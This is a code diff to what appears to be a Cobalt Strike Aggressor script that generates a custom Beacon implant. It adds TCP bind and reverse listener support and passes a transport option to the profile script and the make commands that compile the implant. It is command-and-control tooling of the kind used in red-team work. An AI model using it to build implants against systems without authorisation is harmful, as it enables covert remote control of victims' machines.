@@ -92,25 +92,38 @@ sub genPayload {
 	$HTTPSvalue = "0";
 	$ListenerName = $3['listener'];
 	$payloadType = listener_info($ListenerName, "payload");
-	if ($payloadType ne "windows/beacon_http/reverse_http" && $payloadType ne "windows/beacon_https/reverse_https")
-	{
-		show_message("This is an invalid listener type for the Custom Beacon! Only reverse_http and reverse_https are supported.");
-		return;
-	}
-	else if ($payloadType eq "windows/beacon_http/reverse_http")
+	$transport = "http";
+
+	if ($payloadType eq "windows/beacon_http/reverse_http")
 	{
 		$HTTPSvalue = "0";
+		$transport = "http";
+	}
+	else if ($payloadType eq "windows/beacon_https/reverse_https")
+	{
+		$HTTPSvalue = "1";
+		$transport = "http";
+	}
+	else if ($payloadType eq "windows/beacon_bind_tcp" || $payloadType eq "windows/beacon_reverse_tcp")
+	{
+		$transport = "tcp";
+		if ($platform eq "macOS") {
+			show_message("TCP transport is not yet supported on macOS!");
+			return;
+		}
 	}
 	else
 	{
-		$HTTPSvalue = "1";
+		show_message("Unsupported listener type: " . $payloadType . ". Only reverse_http, reverse_https, and bind/reverse_tcp are supported.");
+		return;
 	}
+
 	$TargetServer = listener_info($ListenerName, "host");
 	$TargetPort = listener_info($ListenerName, "port");
 	
 	# InsertListenerInfo.py runs validate_profile.py + render_profile_header.py
 	# so generation fails fast before make if profile config is invalid.
-	$command = "python3 InsertListenerInfo.py " . $TargetServer . " " . $TargetPort . " " . $HTTPSvalue . " " . $ProfilePath . $TargetFlag;
+	$command = "python3 InsertListenerInfo.py " . $TargetServer . " " . $TargetPort . " " . $HTTPSvalue . " " . $ProfilePath . $TargetFlag . " --transport " . $transport;
 	println($command);
 	$process = exec($command, $null, $GeneratePayloadDirectory);
 	@data = readAll($process);
@@ -144,7 +157,7 @@ sub genPayload {
 	#
 	# Build implant
 	#
-	$command = "make clean -f Makefile OUTPUT=" . $filename;
+	$command = "make clean -f Makefile OUTPUT=" . $filename . " TRANSPORT=" . $transport;
 	println($command);
 	$process = exec($command, $null, $TargetImplantDir);
 	@data = readAll($process);
@@ -153,7 +166,7 @@ sub genPayload {
     }
     closef($process);
 	
-	$command = "make -f Makefile OUTPUT=" . $filename;
+	$command = "make -f Makefile OUTPUT=" . $filename . " TRANSPORT=" . $transport;
 	println($command);
 	$process = exec($command, $null, $TargetImplantDir);
 	@data = readAll($process);
